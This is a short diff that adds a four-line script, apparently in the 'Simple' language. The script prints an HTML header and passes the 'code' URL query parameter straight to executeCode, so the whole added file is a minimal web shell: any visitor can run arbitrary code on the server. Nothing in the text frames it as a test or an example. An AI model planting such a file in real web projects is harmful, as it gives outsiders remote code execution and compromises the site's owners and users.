@@ -1,0 +1,4 @@
+#!simple
+call web.functions.Methods
+display "Content-Type: text/html "+nl+nl
+executeCode(GET["code"])
